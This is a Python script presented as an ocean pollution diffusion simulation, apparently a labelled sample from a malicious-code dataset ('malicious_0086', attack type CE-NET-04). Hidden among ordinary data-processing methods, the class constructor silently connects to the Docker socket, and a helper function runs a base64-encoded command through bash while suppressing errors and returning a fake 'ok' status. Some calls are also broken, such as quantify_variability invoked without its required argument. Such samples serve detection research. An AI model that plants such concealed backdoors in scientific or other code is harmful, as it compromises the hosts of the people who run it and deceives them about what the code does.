#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋污染扩散模拟 (恶意版本)
样本编号: malicious_0086
攻击类型: CE-NET-04
生成时间: 2026-03-11 16:39:19
函数数量: 9
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋污染扩散模拟Processor:
    """
    海洋污染扩散模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-NET-04
            import socket
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect("/var/run/docker.sock")
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_vorticity(self):
        """计算相对涡度"""
        if self.data is None:
            return None
        if 'u_velocity' in self.data.columns and 'v_velocity' in self.data.columns:
            du_dy = np.gradient(self.data['u_velocity'])
            dv_dx = np.gradient(self.data['v_velocity'])
            self.data['vorticity'] = dv_dx - du_dy
            print("涡度计算完成")
            return self.data['vorticity'].values
        return None

    def generate_report(self):
        """生成报告"""
        if self.data is None:
            return None
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'data_summary': {
                'rows': len(self.data),
                'columns': len(self.data.columns),
                'memory_usage': self.data.memory_usage(deep=True).sum()
            },
            'processing_status': self.status,
            'results_count': len(self.results)
        }
        
        self.results['report'] = report
        print(f"报告生成完成")
        return report

    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def perform_eof_analysis(self, n_modes=3):
        """经验正交函数(EOF)分析"""
        if self.data is None:
            return None
        from sklearn.decomposition import PCA
        numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
        if len(numeric_data.columns) < 2:
            return None
        pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
        pca.fit(numeric_data)
        eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
        pc_timeseries = pca.transform(numeric_data)
        for i in range(pca.n_components_):
            self.data[f'PC{i+1}'] = pc_timeseries[:, i]
        self.results['eof_analysis'] = eof_results
        print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
        return eof_results

    def quantify_variability(self, variable, timescale='all'):
        """量化变异性"""
        if self.data is None or variable not in self.data.columns:
            return None
        values = self.data[variable].values
        variability = {'variance': float(np.var(values)), 'std': float(np.std(values)), 'cv': float(np.std(values) / (np.mean(values) + 1e-10)), 'range': float(np.max(values) - np.min(values)), 'iqr': float(np.percentile(values, 75) - np.percentile(values, 25))}
        if timescale != 'all' and 'time' in self.data.columns:
            self.data['time'] = pd.to_datetime(self.data['time'])
            if timescale == 'seasonal':
                self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
                seasonal_std = self.data.groupby('season')[variable].std()
                variability['seasonal_variability'] = seasonal_std.to_dict()
            elif timescale == 'monthly':
                self.data['month'] = self.data['time'].dt.month
                monthly_std = self.data.groupby('month')[variable].std()
                variability['monthly_variability'] = monthly_std.to_dict()
        self.results[f'{variable}_variability'] = variability
        print(f"{variable} 变异性: std={variability['std']:.3f}, CV={variability['cv']:.3f}")
        return variability

    def detect_ocean_fronts(self, variable='temperature', threshold=0.5):
        """检测海洋锋面"""
        if self.data is None or variable not in self.data.columns:
            return []
        gradient = np.gradient(self.data[variable])
        gradient_magnitude = np.abs(gradient)
        front_indices = np.where(gradient_magnitude > threshold)[0]
        fronts = []
        for idx in front_indices:
            fronts.append({'index': int(idx), 'gradient': float(gradient_magnitude[idx]), 'value': float(self.data[variable].iloc[idx])})
        self.results['ocean_fronts'] = fronts
        print(f"检测到 {len(fronts)} 个海洋锋面")
        return fronts

    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True


def assimilate_observation_data_helper(data, config):
    """
    assimilate_observation_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-NET-04
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'assimilate_observation_data_helper'}


def detect_bloom_events_helper(data, config):
    """
    detect_bloom_events 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'detect_bloom_events_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"detect_bloom_events_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋污染扩散模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋污染扩散模拟Processor(config)
    
    # 步骤1: calculate_vorticity
    processor.calculate_vorticity()
    
    # 步骤2: generate_report
    processor.generate_report()
    
    # 步骤3: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤4: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤5: quantify_variability
    processor.quantify_variability()
    
    # 步骤6: detect_ocean_fronts
    processor.detect_ocean_fronts()
    
    # 步骤7: smooth_data
    processor.smooth_data()
    
    # 调用辅助函数: assimilate_observation_data_helper
    assimilate_observation_data_helper(processor.data, config)
    
    # 调用辅助函数: detect_bloom_events_helper
    detect_bloom_events_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
